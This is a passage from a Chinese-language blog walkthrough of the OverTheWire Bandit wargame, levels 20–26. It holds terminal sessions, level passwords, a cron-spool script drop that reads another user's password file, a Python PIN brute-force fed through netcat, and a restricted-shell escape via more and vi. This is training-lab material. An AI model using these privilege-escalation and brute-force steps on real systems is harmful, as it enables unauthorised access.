program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.</div><div class=\"line\"><span class=\"comment\"># 嗯 上面的报道基本没什么偏差…… 我们来运行一下，端口号是我们上面自定义的监听端口「23333」</span></div><div class=\"line\">bandit20@bandit:~$ ./suconnect 23333</div><div class=\"line\">Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j</div><div class=\"line\">Password matches, sending next password</div><div class=\"line\"><span class=\"comment\"># 程序告诉我们，他读到了我们发送给他的密码「GbKksEFF4yrVs6il55v6gwY5aVje5f0j」，密码抱对成功，下一关的密码已发送。</span></div></pre></td></tr></table></figure></p>\n<p>那我们再来看一眼监听的那一边：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit20@bandit:~$ nc <span class=\"_\">-l</span> 23333 &lt; /etc/bandit_pass/bandit20 <span class=\"comment\"># 这条是我们之前的</span></div><div class=\"line\">gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr <span class=\"comment\">#收到了密码</span></div><div class=\"line\">bandit20@bandit:~$ <span class=\"comment\"># 出现了它，表示 nc 命令结束了执行。</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"思路二：\"><a href=\"#思路二：\" class=\"headerlink\" title=\"思路二：\"></a>思路二：</h3><p>这个思路其实我之前叙述的时候已经透露出一些味道了，细心的应该已经不用我说了。<br>关键词「&amp;」。<br>这道题创建两个终端去连接的根本原因是因为监听和执行会占用两个终端，那我们把监听扔到后台去跑不就解决了吗。<br>连接姿势为正常姿势不多说……算了还是多说个j8（图）吧：<br><img src=\"/Image/bandit_resources/7BBE68BB3C0BC4EC581DB35ABD35E039.jpg\" alt=\"IMAGE\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 放在后台执行</span></div><div class=\"line\">bandit20@bandit:~$ nc <span class=\"_\">-l</span> 23333 &lt; /etc/bandit_pass/bandit20 &amp; </div><div class=\"line\"><span class=\"comment\"># 后台运行进程代号[1]，PID 为 1135 </span></div><div class=\"line\">[1] 1135</div><div class=\"line\">bandit20@bandit:~$ ./suconnect 23333</div><div class=\"line\">Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j</div><div class=\"line\">Password matches, sending next password</div><div class=\"line\"><span class=\"comment\"># 后台进程返回了得到的信息（密码）到标准输出（你当前的终端）</span></div><div class=\"line\">gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr</div><div class=\"line\"><span class=\"comment\"># 后台进程运行结束，命令为：nc -l 23333 &lt; /etc/bandit_pass/bandit20</span></div><div class=\"line\">[1]+  Done                    nc <span class=\"_\">-l</span> 23333 &lt; /etc/bandit_pass/bandit20</div><div class=\"line\">bandit20@bandit:~$</div></pre></td></tr></table></figure>\n<p>心路历程：嗯，先说思路一的理由是我怕我先写思路二，再写的思路一可能没人看了。</p>\n<p>Level 21 - 22</p>\n<p>描述：一个程序从cron（基于时间的作业调度程序）定期自动运行。查看/etc/cron.d/中的配置并查看正在执行的命令。</p>\n<p>密码：Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 进入描述中的文件夹</span></div><div class=\"line\">bandit21@bandit:~$ <span class=\"built_in\">cd</span> /etc/cron.d/</div><div class=\"line\">bandit21@bandit:/etc/cron.d$ ll</div><div class=\"line\">total 28</div><div class=\"line\">drwxr-xr-x   2 root root 4096 Nov 13 15:58 ./</div><div class=\"line\">drwxr-xr-x 101 root root 4096 Nov 13 15:58 ../</div><div class=\"line\">-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder</div><div class=\"line\">-rw-r--r--   1 root root  120 Nov 13 15:58 cronjob_bandit22</div><div class=\"line\">-rw-r--r--   1 root root  122 Nov 13 15:58 cronjob_bandit23</div><div class=\"line\">-rw-r--r--   1 root root  120 Nov 13 15:58 cronjob_bandit24</div><div class=\"line\">-rw-r--r--   1 root root  190 Oct 31 13:21 popularity-contest</div><div class=\"line\"><span class=\"comment\"># 不要问我为什么，就是直觉</span></div><div class=\"line\">bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22</div><div class=\"line\">@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null</div><div class=\"line\">* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null</div><div class=\"line\"><span class=\"comment\"># 他会跑这个脚本，那我们去看看</span></div><div class=\"line\">bandit21@bandit:/etc/cron.d$ cat -n /usr/bin/cronjob_bandit22.sh</div><div class=\"line\">     1  <span class=\"comment\">#!/bin/bash</span></div><div class=\"line\">     2  chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</div><div class=\"line\">     3  cat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</div><div class=\"line\"><span class=\"comment\"># 他会往这个脚本里跑内容</span></div><div class=\"line\">bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</div><div class=\"line\">Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI</div></pre></td></tr></table></figure>\n<p>心路历程：甚至不需要知道他所说的 cron 是干什么的，我们就能找到密码（当然，游戏放水也有很大因素）。不过该知道的还是要知道的，cron 是 Linux 的守护进程。通俗一点就是我们平时接触到的计划任务，按照规定时间安排定期执行动作的。其中的 cronjob_bandit* 就是提供给 cron 执行的文件。「* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;> /dev/null」前面的「*」是每分钟执行一次，「bandit22」是用它的身份执行，「/usr/bin/cronjob_bandit22.sh」是被执行脚本，至于「&amp;> /dev/null」 前面都有分别提到过，不说任性。</p>\n<hr>\n<p>Level 22 - 23</p>\n<p>描述：一个程序从cron（基于时间的作业调度程序）定期自动运行。查看/etc/cron.d/中的配置并查看正在执行的命令。 注意：查看其他人编写的shell脚本是非常有用的技巧。这个级别的脚本是故意易于阅读。如果您在理解它的功能时遇到问题，请尝试执行它以查看打印的调试信息。</p>\n<p>密码：jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit22@bandit:~$ ll /etc/cron.d</div><div class=\"line\">total 28</div><div class=\"line\">drwxr-xr-x   2 root root 4096 Nov 13 15:58 ./</div><div class=\"line\">drwxr-xr-x 101 root root 4096 Nov 13 15:58 ../</div><div class=\"line\">-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder</div><div class=\"line\">-rw-r--r--   1 root root  120 Nov 13 15:58 cronjob_bandit22</div><div class=\"line\">-rw-r--r--   1 root root  122 Nov 13 15:58 cronjob_bandit23</div><div class=\"line\">-rw-r--r--   1 root root  120 Nov 13 15:58 cronjob_bandit24</div><div class=\"line\">-rw-r--r--   1 root root  190 Oct 31 13:21 popularity-contest</div><div class=\"line\">bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23</div><div class=\"line\">@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null</div><div class=\"line\">* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null</div><div class=\"line\">bandit22@bandit:~$ cat -n /usr/bin/cronjob_bandit23.sh</div><div class=\"line\">     1  <span class=\"comment\">#!/bin/bash</span></div><div class=\"line\">     2</div><div class=\"line\">     3  myname=$(whoami)</div><div class=\"line\">     4  mytarget=$(<span class=\"built_in\">echo</span> I am user <span class=\"variable\">$myname</span> | md5sum | cut <span class=\"_\">-d</span> <span class=\"string\">' '</span> <span class=\"_\">-f</span> 1)</div><div class=\"line\">     5</div><div class=\"line\">     6  <span class=\"built_in\">echo</span> <span class=\"string\">\"Copying passwordfile /etc/bandit_pass/<span class=\"variable\">$myname</span> to /tmp/<span class=\"variable\">$mytarget</span>\"</span></div><div class=\"line\">     7</div><div class=\"line\">     8  cat /etc/bandit_pass/<span class=\"variable\">$myname</span> &gt; /tmp/<span class=\"variable\">$mytarget</span></div><div class=\"line\"></div><div class=\"line\">cat /etc/bandit_pass/<span class=\"variable\">$myname</span> &gt; /tmp/<span class=\"variable\">$mytarget</span></div><div class=\"line\">bandit22@bandit:~$ myname=<span class=\"string\">\"bandit23\"</span></div><div class=\"line\">bandit22@bandit:~$ mytarget=$(<span class=\"built_in\">echo</span> I am user <span class=\"variable\">$myname</span> | md5sum | cut <span class=\"_\">-d</span> <span class=\"string\">' '</span> <span class=\"_\">-f</span> 1)</div><div class=\"line\">bandit22@bandit:~$ <span class=\"built_in\">echo</span> <span class=\"string\">\"Copying passwordfile /etc/bandit_pass/<span class=\"variable\">$myname</span> to /tmp/<span class=\"variable\">$mytarget</span>\"</span></div><div class=\"line\">Copying passwordfile /etc/bandit_pass/bandit23 to /tmp/8ca319486bfbbc3663ea0fbe81326349</div><div class=\"line\">bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349</div><div class=\"line\">jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n</div></pre></td></tr></table></figure>\n<p>心路历程：这里的定位思路与上一关没什么区别，最后会要你分析这个简单的代码。因为 cronjob_bandit23 文件中指定的用户是 bandit23，whoami 的结果也是这个，我们就直接赋值然后走流程就行了。</p>\n<hr>\n<p>Level 23 -24</p>\n<p>描述：一个程序从cron（基于时间的作业调度程序）定期自动运行。查看/etc/cron.d/中的配置并查看正在执行的命令。 </p>\n<p>注意：这个级别要求你创建你自己的第一个shell脚本。这是非常大的一步，当你击败这个级别时，你应该为自己感到骄傲！ </p>\n<p>注意2：请记住，你的shell脚本一旦执行就会被删除，所以你可能想保留一个副本…</p>\n<p>密码：UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit23@bandit:/var/spool/bandit24$ ll /etc/cron.d</div><div class=\"line\">total 28</div><div class=\"line\">drwxr-xr-x   2 root root 4096 Nov 13 15:58 ./</div><div class=\"line\">drwxr-xr-x 101 root root 4096 Nov 16 10:18 ../</div><div class=\"line\">-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder</div><div class=\"line\">-rw-r--r--   1 root root  120 Nov 13 15:58 cronjob_bandit22</div><div class=\"line\">-rw-r--r--   1 root root  122 Nov 13 15:58 cronjob_bandit23</div><div class=\"line\">-rw-r--r--   1 root root  120 Nov 13 15:58 cronjob_bandit24</div><div class=\"line\">-rw-r--r--   1 root root  190 Oct 31 13:21 popularity-contest</div><div class=\"line\">bandit23@bandit:/var/spool/bandit24$ cat /etc/cron.d/cronjob_bandit24</div><div class=\"line\">@reboot bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null</div><div class=\"line\">* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null</div><div class=\"line\">bandit23@bandit:/var/spool/bandit24$ cat -n /usr/bin/cronjob_bandit24.sh</div><div class=\"line\">     1  <span class=\"comment\">#!/bin/bash</span></div><div class=\"line\">     2</div><div class=\"line\">     3  myname=$(whoami)</div><div class=\"line\">     4</div><div class=\"line\">     5  <span class=\"built_in\">cd</span> /var/spool/<span class=\"variable\">$myname</span></div><div class=\"line\">     6  <span class=\"built_in\">echo</span> <span class=\"string\">\"Executing and deleting all scripts in /var/spool/<span class=\"variable\">$myname</span>:\"</span></div><div class=\"line\">     7  <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> * .*;</div><div class=\"line\">     8  <span class=\"keyword\">do</span></div><div class=\"line\">     9      <span class=\"keyword\">if</span> [ <span class=\"string\">\"<span class=\"variable\">$i</span>\"</span> != <span class=\"string\">\".\"</span> <span class=\"_\">-a</span> <span class=\"string\">\"<span class=\"variable\">$i</span>\"</span> != <span class=\"string\">\"..\"</span> ];</div><div class=\"line\">    10      <span class=\"keyword\">then</span></div><div class=\"line\">    11          <span class=\"built_in\">echo</span> <span class=\"string\">\"Handling <span class=\"variable\">$i</span>\"</span></div><div class=\"line\">    12          timeout <span class=\"_\">-s</span> 9 60 ./<span class=\"variable\">$i</span></div><div class=\"line\">    13          rm <span class=\"_\">-f</span> ./<span class=\"variable\">$i</span></div><div class=\"line\">    14      <span class=\"keyword\">fi</span></div><div class=\"line\">    15  <span class=\"keyword\">done</span></div><div class=\"line\">bandit23@bandit:/var/spool/bandit24$ <span class=\"built_in\">echo</span> <span class=\"string\">\"cat /etc/bandit_pass/bandit24 &gt; /tmp/bandit24_pass\"</span> &gt; /var/spool/bandit24/bandit24_getpwd ; chmod 777 bandit24_getpwd ; chmod 777 /tmp/bandit24_pass</div><div class=\"line\">bandit23@bandit:/var/spool/bandit24$ cat chmod 777 /tmp/bandit24_pass</div><div class=\"line\">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</div></pre></td></tr></table></figure>\n<p>心路历程：我们定位脚本的思路不变，看脚本发现：该脚本会执行 <code>/var/spool/bandit24</code> 的脚本，60s 如果还没之行结束会强制kill掉，然后删除。所以我们写了一个把 <code>/etc/bandit\\_pass/bandit24/</code> 输出到 /tmp/bandit24_pass 的脚本到这个目录下，然后付了个权限。</p>\n<hr>\n<p>Level 24 - 25</p>\n<p>描述：一个守护进程正在监听端口30002，如果给出了bandit24的密码和一个秘密的数字4位pincode，将给你bandit25的密码。没有办法检索pincode，除非枚举10000个组合，称为蛮力。</p>\n<p>密码：uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit24@bandit:~$ vim /tmp/boom.py</div><div class=\"line\">bandit24@bandit:~$ cat -n /tmp/boom.py</div><div class=\"line\">     1  <span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\">     2</div><div class=\"line\">     3  fl = open(<span class=\"string\">'/tmp/boom_dict.txt'</span>, <span class=\"string\">'w+'</span>)</div><div class=\"line\">     4  <span class=\"built_in\">pwd</span> = <span class=\"string\">'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'</span></div><div class=\"line\">     5  <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(10000):</div><div class=\"line\">     6      fl.write(<span class=\"built_in\">pwd</span> + <span class=\"string\">' '</span> + str(i).zfill(4) + <span class=\"string\">'\\n'</span>)</div><div class=\"line\">     7  fl.close()</div><div class=\"line\">     8</div><div class=\"line\">bandit24@bandit:~$ python /tmp/boom.py</div><div class=\"line\">bandit24@bandit:~$ head /tmp/boom_dict.txt</div><div class=\"line\">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000</div><div class=\"line\">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0001</div><div class=\"line\">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0002</div><div class=\"line\">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0003</div><div class=\"line\">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0004</div><div class=\"line\">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0005</div><div class=\"line\">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0006</div><div class=\"line\">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0007</div><div class=\"line\">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0008</div><div class=\"line\">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0009</div><div class=\"line\">bandit24@bandit:~$ nc localhost 30002 &lt; /tmp/boom_dict.txt &gt; /tmp/reply_pwd.txt</div><div class=\"line\">bandit24@bandit:~$ sort /tmp/reply_pwd.txt | uniq -u</div><div class=\"line\"></div><div class=\"line\">Correct!</div><div class=\"line\">Exiting.</div><div class=\"line\">I am the pincode checker <span class=\"keyword\">for</span> user bandit25. Please enter the password <span class=\"keyword\">for</span> user bandit24 and the secret pincode on a single line, separated by a space.</div><div class=\"line\">The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG</div></pre></td></tr></table></figure>\n<p>心路历程：这关描述也很清晰（虽然我是机翻）。它开放了一个 30002 端口监听，你给他发 bandit24 的密码 +空格 + 四位数字，如果这个字符串正确它就会返回给你 bandit25 的密码。 Bandit24 的密码我们很容易得到，那问题就是这个4位数了。描述中说我们只能尝试暴力破解，那就从「0001」到「9999」都生成出来，分别与 bandit24的密码+空格连接，把这一万个组合都试一下。于是写了一个 python 脚本生成这个含有 10000 种组合的文件，并提交给 30002 端口，把返回的信息存放在文件中，然后筛选文件内正确信息。</p>\n<hr>\n<p>Level 25 - 26</p>\n<p>描述：从bandit25登录到bandit26应该相当简单…用户bandit26的shell不是/ bin / bash，而是别的。找出它是什么，它是如何工作的，以及如何摆脱它。</p>\n<p>密码：5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit25@bandit:~$ ls</div><div class=\"line\">bandit26.sshkey</div><div class=\"line\">bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost        </div><div class=\"line\">Could not create directory <span class=\"string\">'/home/bandit25/.ssh'</span>.</div><div class=\"line\">The authenticity of host <span class=\"string\">'localhost (127.0.0.1)'</span> can<span class=\"string\">'t be established.</span></div><div class=\"line\">ECDSA key fingerprint is SHA256:rm2/oZ03et2au9vHBOtBNdgMDGJkbNqdkmHDLPDD32E.</div><div class=\"line\">Are you sure you want to continue connecting (yes/no)? yes</div><div class=\"line\"> | |                   | (_) | |__ \\ / /  </div><div class=\"line\"> | |__   __ _ _ __   __| |_| |_   ) / /_  </div><div class=\"line\"> | '_ \\ / _` | <span class=\"string\">'_ \\ / _` | | __| / / '</span>_ \\ </div><div class=\"line\"> | |_) | (_| | | | | (_| | | |_ / /| (_) |</div><div class=\"line\"> |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/ </div><div class=\"line\">Connection to localhost closed.</div><div class=\"line\">bandit25@bandit:~$  </div><div class=\"line\"><span class=\"comment\"># ssh 连接以后把我提出来了。。。</span></div><div class=\"line\"><span class=\"comment\"># 题目提示 bandit26 的 shell 不是 /bin/bash，那我们看看是什么</span></div><div class=\"line\">bandit25@bandit:~$ cat /etc/passwd | grep bandit26</div><div class=\"line\">bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext</div><div class=\"line\">bandit25@bandit:~$ cat -n /usr/bin/showtext</div><div class=\"line\">     1  <span class=\"comment\">#!/bin/sh</span></div><div class=\"line\">     2</div><div class=\"line\">     3  <span class=\"built_in\">export</span> TERM=linux</div><div class=\"line\">     4</div><div class=\"line\">     5  more ~/text.txt</div><div class=\"line\">     6  <span class=\"built_in\">exit</span> 0</div><div class=\"line\"><span class=\"comment\"># more 命令是一次显示一屏文字，然后左下角会显示一个 more 和当前显示了百分之多少</span></div><div class=\"line\"><span class=\"comment\"># 我们在回头看看上面登陆后的字符画：</span></div><div class=\"line\"><span class=\"comment\"># | |                   | (_) | |__ \\ / /  </span></div><div class=\"line\"><span class=\"comment\"># | |__   __ _ _ __   __| |_| |_   ) / /_  </span></div><div class=\"line\"><span class=\"comment\"># | '_ \\ / _` | '_ \\ / _` | | __| / / '_ \\ </span></div><div class=\"line\"><span class=\"comment\"># | |_) | (_| | | | | (_| | | |_ / /| (_) |</span></div><div class=\"line\"><span class=\"comment\"># |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/ </span></div><div class=\"line\"><span class=\"comment\"># 之前在其他登陆中不曾见过，想必就是 more 命令显示的 text.txt 的内容</span></div><div class=\"line\"><span class=\"comment\"># 因为行数足以一屏显示完，所以没有显示 more 就没有显示</span></div><div class=\"line\"><span class=\"comment\"># 我们的思路就在 more 的这个特点上。我们要让他卡在一屏读不完的位置，也就是让你的终端高度读不下6行（字符画高度）。</span></div><div class=\"line\"><span class=\"comment\"># 这样我们可以在 more 的状态下通过一些特性执行命令找到我们下一关的密码。</span></div><div class=\"line\"><span class=\"comment\"># 因为上面的字符画有6行，而使用 chrome 没办法变那么窄，我们转而使用系统的命令行 ssh 上去搞。</span></div></pre></td></tr></table></figure>\n<p>我们先连接上去<br><img src=\"/Image/bandit_resources/9E633BCC3C0A9193B0E8E2C2B65731BA.jpg\" alt=\"IMAGE\"><br>然后我们使用 bandit25 这个用户带着 bandit26 的 privatekey 去连接 bandit26<br><img src=\"/Image/bandit_resources/D9A392F2C38EC45B17ACAAB75A5E3890.jpg\" alt=\"IMAGE\"><br>more 命令像预期一样输出一屏后等待我们的动作：<br><img src=\"/Image/bandit_resources/E02BACB49695839AC213BC250033CBDE.jpg\" alt=\"IMAGE\"><br>我们看看手册，有没有能我们需要的东西：<br><img src=\"/Image/bandit_resources/A821D5D2B3FBEF8E79E26DE69CA97891.jpg\" alt=\"IMAGE\"><br>这个v命令能让我们进入 vi 模式，虽然不常用 vi，但经常 vim 敲代码，经常使用「:sp」「:vsp」这种能打开其他文件的命令。<br>我们再去看看 vi 的 man 手册：<br><img src=\"/Image/bandit_resources/06367F7F7B9D0A55C16D0B51300F9A4B.jpg\" alt=\"IMAGE\"><br>看起来就是我们需要的命令，那我们去试试。<br>在 more 的页面按v进入vi<br><img src=\"/Image/bandit_resources/FDDCDF1F1AA31D4A681D965AB9B27E74.jpg\" alt=\"IMAGE\"><br>然后使用命令 <code>:ex! /etc/bandit_pass/bandit26</code> 打开我们需要的密码文件：<br><img src=\"/Image/bandit_resources/DDF96BC0FFF6CC6F41E8694DBDC1CE1E.jpg\" alt=\"IMAGE\"></p>\n<p>心路历程：这关很有意思，刚好 more 与 vi 这两个命令我都不常用，查阅文档与测试了一番。诸如登陆时候的字符画与 more 这种小细节，透过终端似乎能在看到设计者的：）</p>\n<hr>\n<p>Level 26 - 27</p>\n<p>描述：<strong>这时候，27级还不存在</strong></p>\n<p>[Game Over]</p>\n<hr>\n<p>嗯……游戏是结束了，我最后问一句：<br><img src=\"/Image/bandit_resources/00023D502683EF1B4545C5273153F690.jpg\" alt=\"IMAGE\"></p>\n","site":{"data":{}},"excerpt":"<p>这次安利一个游戏。<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"> _                     _ _ _   </div><div class=\"line\">| |__   __ _ _ __   __| (_) |_ </div><div class=\"line\">| <span class=\"string\">'_ \\ / _` | '</span>_ \\ / _` | | __|</div><div class=\"line\">| |_) | (_| | | | | (_| | | |_ </div><div class=\"line\">|_.__/ \\__,_|_| |_|\\__,_|_|\\__|</div></pre></td></tr></table></figure></p>\n<p>游戏呢是给初学者设计的，新手刚好可以一边过关一边学习一些 Linux 的基本操作。<br>先说说这个游戏怎么玩吧：<br>我们这个游戏有27关，对应27对账号密码组合。开始的时候送我们一个第一关的账号密码：「bandit0」-「bandit0」。<br>我们需要使用这个账号登陆服务器并找到「bandit1」的密码，然后使用得到的密码登陆「bandit1」，再找到「bandit2」的密码……</p>\n<p>咦，等一下，这游戏怎么有种……「你追我，如果你追到我，我就让你嘿嘿嘿」的感觉呢……<br>","more":"<br>然而通关以后冰冷的现实告诉我：<br><img src=\"/Image/bandit_resources/27CB93E553A707C15C1AB4DCFA52EFBA.jpg\" alt=\"\"><br>……</p>\n<p>游戏呢，是需要自己动手玩的，这篇文章只是记录了我的通关思路和过程，可以参考，但也别无脑拷。<br>下面的通关记录是在玩游戏的过程中边玩边记录的，所以比较正经，想上车的同学可以下车了～<br>前几关写的比较细，也是考虑到新手一上来就看不懂很闹心，然后又要浪费蛋白质，嗯你懂的：）</p>\n<p>如果有好的思路，欢迎留言。</p>\n<h1 id=\"Bandit-游戏规则\"><a href=\"#Bandit-游戏规则\" class=\"headerlink\" title=\"Bandit 游戏规则\"></a>Bandit 游戏规则</h1><p>强盗战争是针对绝对的初学者。它会教授需要能够玩其他战争游戏的基础知识。</p>\n<p>……（剩下不翻译了，懒～</p>\n<p>Level 0 </p>\n<p>两种姿势：1.终端直接 ssh 。2.看下面</p>\n<p>Chrome 插件 「Secure Shell」</p>\n<p><img src=\"/Image/bandit_resources/851073B8A9CDFA81ECB4F7719C7BDA39.jpg\" alt=\"\"></p>\n<p>按上图配置好各项后按「Enter」或点击「连接」</p>\n<p><img src=\"/Image/bandit_resources/608E268171D41C5563D62EA2F9F30FDE.jpg\" alt=\"\"></p>\n<p>输入页面中告诉我们的密码：bandit0</p>\n<p>（输入密码时是隐式输入，光标不会动，不要以为卡了，正常输入后按回车等待反馈信息就好）</p>\n<p><img src=\"/Image/bandit_resources/BE3283D120238F44FADC24C8EA3F5CB8.jpg\" alt=\"\"></p>\n<p>见到这个东西就证明我们使用 SSH 连接服务器成功了。我们就可以用手中的这台电脑操作这台服务器了。</p>\n<hr>\n<p>Level 0 - 1</p>\n<p>描述：下一级别的密码存储在位于主目录中的名为readme的文件中。使用此密码 SSH 登录到bandit1。<br>密码：boJ9jbbUNNfktd78OOpsqOltutMc3MY1</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit0@bandit:~$ ls</div><div class=\"line\">readme</div><div class=\"line\">bandit0@bandit:~$ cat readme</div><div 